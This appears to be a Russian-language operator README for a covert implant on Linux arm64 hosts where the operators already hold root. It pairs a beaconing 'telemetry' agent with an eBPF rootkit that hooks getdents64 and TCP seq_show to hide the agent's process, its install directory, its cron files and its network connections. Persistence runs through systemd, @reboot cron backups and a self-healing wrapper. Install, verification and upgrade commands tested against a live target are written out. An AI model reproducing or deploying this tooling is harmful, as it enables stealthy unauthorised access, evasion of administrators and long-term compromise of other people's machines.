# Телеметрия: агент + eBPF-сокрытие (Linux, arm64 / aarch64)

Поставка для цели, где у нас уже есть root. Ставится одной командой и поднимает **два слоя**:

1. **Агент телеметрии** `wdcd-guoxin` — systemd-юнит `wdcd-guoxin.service`, каталог
   `/usr/lib/.wdcd-gx/`, отдельный Solana-ключ (slot 21, pubkey `3oHYYKeDu75QwgaNKdx2vF7ryKgGgj1qRCWvZqQHHNEk`).
   Также доступен Go-loader **sysmond** (`deploy/sysmond`, arm64) в паре с `hide.bpf.o`.
2. **eBPF-сокрытие** — loader `sysmond` + программа `hide.bpf.o`, юнит
   `sysmond.service`, бэкапы `@reboot` в `/etc/cron.d/sysmond` и
   `/etc/cron.d/wdcd-guoxin`, самовосстановление во вложенном `sysmond-run`.

## Состав поставки

| Файл | Назначение |
|---|---|
| `deploy.sh` | идемпотентная установка обоих слоёв |
| `hide_install.sh` | установка/апгрейд eBPF-слоя |
| `hide.bpf.o` | eBPF-объект (1 прога enter + exit + tail-call, aarch64, собран `clang -target bpf`) |
| `sysmond` | Go-loader (cilium/ebpf), статический arm64 |
| `sysmond-run` | системный wrapper: вечный цикл, резолвит PID агента из `MainPID`, рестартует loader |
| `e2e_test.sh` / `e2e_selfheal.sh` | сквозные проверки сокрытия и самолечения |

Исходники: `module/hide.bpf.c` (программа) + `loader/main.go` (загрузчик).

## Установка

```
tar xzf <пакет>.tar.gz && cd <каталог}
bash deploy.sh
```

Именно `bash`: на Ubuntu `/bin/sh` — dash, а скрипты используют `set -o pipefail` и `(( ))`.

## Типы скрытий (что прячет eBPF-слой)

Хук — tracepoint `sys_enter/getdents64` + `sys_exit/getdents64`, патч user-буфера
dirent in-place (memmove оставшихся записей, корректные `d_reclen`/`bpos`) + tail-call
на процесс-патчер.

| # | Что скрывается | Как | Механика |
|---|---|---|---|
| 1 | **Процесс агента** (`ps`, `pgrep`, `/proc/<pid>`, `top`) | PID в `pid_to_hide` | exit-хук вырезает dirent каталога с именем = PID из перечисления `/proc` |
| 2 | **Каталог установки** `/usr/lib/.wdcd-gx` | `-name2 .wdcd-gx` | exit-хук вырезает запись с точным совпадением имени (`name_matches`) из любого листинга РОДИТЕЛЬСКОГО каталога |
| 3 | **cron-файлы** `/etc/cron.d/wdcd-guoxin`, `/etc/cron.d/sysmond` | `-name1 wdcd-guoxin -name3 sysmond` | та же точная выборка по имени во время `ls /etc/cron.d` |
| 4 | *(опц.)* **TCP-соединение** из `ss`/`netstat` | `-hide-ip`/`-hide-port` | kprobe `tcp4/6_seq_show`, направляет соединение на виртуальный удалённый адрес `127.0.0.1:<port>` |

Особенности реализации:

- Скрытие имён — **точное совпадение** (`name_matches`, сравнение длины + `strncmp` через
  `bpf_probe_read_user_str`), а не префикс. Поэтому `wdcd-guoxin` в файловой системе скрыт,
  а системный юнит `wdcd-guoxin.service` (имя ≠) остаётся виден — systemd его нормально
  перезагружает (`daemon-reload`) и процесс не «теряет» свои сервисные файлы.
- Вырезание всех совпадений за один вызов (inline-цикл по dirent-буферу, а не
  tail-call-одна-запись) — несколько cron-записей скрываются за один `ls`.
- Заполнение имён — **скалярные const-volatile поля** (`hide_name1/2/3` + `*_len`),
  как рабочий `pid_to_hide`. Многомерный BTF-массив (`char[3][64]`) из Go-загрузчика
  не адресуется по имени элемента — поля оставались нулевыми, сокрытие имён молча не
  работало. Прямые поля (паттерн `pid_to_hide`) обходят эту проблему.
- PID/логика совпадения матчатся через `name_is_hidden_pid()` и `name_is_hidden_any()`:
  имена подтягиваются из rodata.

## Проверка после установки

```bash
systemctl is-active wdcd-guoxin.service wdcd-ebpf-hide.service   # active / active
systemctl is-active sysmond.service                                # если eBPF-слой отдельным юнитом
# агент жив?
P=$(systemctl show -p MainPID --value wdcd-guoxin.service)
kill -0 "$P" && echo alive
# скрыт ли PID и каталог?
ls /proc | grep -qx "$P" || echo pid-hidden
ls -a /usr/lib/ | grep -x .wdcd-gx || echo dir-hidden
# скрыты ли cron-записи?
ls -a /etc/cron.d/ | grep -E 'wdcd-guoxin|sysmond' || echo cron-hidden
# systemd-юнит при этом виден (правильно)?
ls /etc/systemd/system/ | grep wdcd-guoxin.service
journalctl -u sysmond -n 20 --no-pager
bpftool prog list | grep -c '^[0-9]*:'     # >= 3 (enter + exit + tail-call)
```

Все условия обязательны: «не видно» без «жив» и «`/proc` цел» ничего не доказывает.
`/proc/<pid>` прямо по адресу доступен (осознанный размен: прямым чтением против перечисления).

## Автозагрузка / переживание ребута

eBPF-слой поднимается **тремя независимыми путями** (reboot переживает:

1. **systemd-юнит** `sysmond.service` (`Type=simple`, `Restart=always`,
   `ExecStart=/usr/lib/.wdcd-gx/bin/sysmond-run`) — основной путь.
2. **`@reboot` cron-бэкапы** `/etc/cron.d/sysmond` (→ `sysmond-run` при живом `pgrep -x sysmond`)
   и `/etc/cron.d/wdcd-guoxin` — на случай, если systemd-юнит мёртв/отключён/расчищен.
3. **Самолечение wrapper**: `sysmond-run` — бесконечный цикл; если loader упал
   (верификатор, дестрой программы, рестарт ядра) — рестартует его через 1 с,
   заново резолвя актуальный `MainPID` агента.

Агент (телеметрия) — отдельный `wdcd-guoxin.service` (`Restart=always` + `cron.d`),
он не зависит от eBPF-слоя: сокрытие может лечь, телеметрия продолжит идти.

## Повторная установка (апгрейд поверх живой цели)

deploy.sh идемпотентен; грабли, пойманные на живой цели:

- **`systemctl enable --now` не перезапускает активный юнит** — нужен `restart` + снятие
  старых обёрток (`pkill -f sysmond-run`, `pkill -x sysmond`).
- **PID агента меняется при рестарте** — wrapper резолвит `MainPID` каждый виток,
  сокрытие возвращается за ~5 с; проверять ПОСЛЕ, не до.
- **Проверка сразу после старта — ложный негатив** (аттач асинхронный). e2e ждёт до 15 с.
- **Код возврата хайдера нельзя глушить** (`|| echo`) — иначе установка рапортует успех
  при неработающем сокрытии.
- **`cp` бинаря поверх работающего процесса = «Text file busy»**: сначала `stop`, потом копия, потом `start`.

## Границы (не обещать больше)

- Скрыто от userspace-перечисления: `ls /proc`, `ps`, `pgrep`, `top`; прямые чтения ядра
  (`systemctl show -p MainPID`, `/proc/<pid>`, `bpftool prog show`) видят.
- `hide.bpf.o` собран под BTF сборочной машины: на чужом ядре либо грузится (CO-RE), либо
  верификатор отвергает — проверять НА ЦЕЛИ.
- Первый «тихий» отстук агента — с джиттером 19–25 мин от старта (не баг).

## Если не поднялось

```bash
journalctl -u sysmond -n 40 --no-pager           # слой сокрытия
journalctl -u wdcd-guoxin -n 40 --no-pager       # агент
bpftool prog list | grep getdents                # программы подключены?
# отладка матчей в live trace:
echo 1 > /sys/kernel/debug/tracing/tracing_on
cat /sys/kernel/debug/tracing/trace_pipe          # искать "hide:" printk
```

Диагностические точки: `hide:` printk (3-арг, лимит bpf_printk = 3 аргумента, больше
верификатор режет) логируют PID- и name-совпадения.
